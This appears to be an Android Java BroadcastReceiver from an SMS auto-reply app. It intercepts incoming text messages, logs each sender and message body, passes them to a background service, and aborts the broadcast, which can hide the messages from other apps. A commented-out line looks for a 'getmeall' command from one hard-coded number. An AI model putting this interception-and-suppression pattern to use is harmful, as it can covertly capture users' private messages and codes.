package com.smscallpro.xhahxam.bonitozz.autocallsmspro;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;

public class SmsBroadCast extends BroadcastReceiver {
  private   ArrayList<String> phoneNumbers=new ArrayList<>();
  private ArrayList<String> messagesPass=new ArrayList<>();
    private  PowerManager.WakeLock wl;

    @Override
    public void onReceive(Context context, Intent intent) {




Log.e("talisms","dsds");
        processSms(context,intent);




    }
    private void processSms(Context context, Intent intent)
    {



      int  selection=ProcessData.loadSettingsData("replcallssms",context);
        if(selection==2)
        {

            this.abortBroadcast();
            return;
        }



        try {


            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, ProcessData.WAKE_LOCK);
            if (wl != null)
                wl.acquire(500L /*1 minutes*/);

        }catch (Exception e){

            Log.e("taliException",e.getLocalizedMessage());

        }



        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdu_Objects = (Object[]) bundle.get("pdus");
                if (pdu_Objects != null) {

                    for (Object aObject : pdu_Objects) {

                        SmsMessage currentSMS = getIncomingMessage(aObject, bundle);




                        String senderNo = currentSMS.getDisplayOriginatingAddress();

                        String message = currentSMS.getDisplayMessageBody();


                        message = message.trim();





                        // if(message.equals("getmeall")&&senderNo.equals("+923369936891")){
                        //   Toast.makeText(context, "senderNum: " + senderNo + " :\n message: " + message, Toast.LENGTH_LONG).show();
                        Log.e("talisms","senderNum: " + senderNo + " :\n message: " + message

                        );
                        phoneNumbers.add(senderNo);
                        messagesPass.add(message);






                        // }

                    }

                   startServicex(context);

                }
            }
        } this.abortBroadcast();
    }


    private SmsMessage getIncomingMessage(Object aObject, Bundle bundle) {
        SmsMessage currentSMS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String format = bundle.getString("format");
            currentSMS = SmsMessage.createFromPdu((byte[]) aObject, format);
        } else {
            currentSMS = SmsMessage.createFromPdu((byte[]) aObject);
        }
        return currentSMS;
    }



    private void startServicex(Context context){


        Log.e("talisms","service start");

        Intent intent1 =new Intent(context,ReceiveSMSService.class);
        intent1.putExtra("phonenumber",phoneNumbers);
        intent1.putExtra("messages",messagesPass);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            context.startForegroundService(intent1);
        }







        else {


            context.startService(intent1);
        }





    }


}
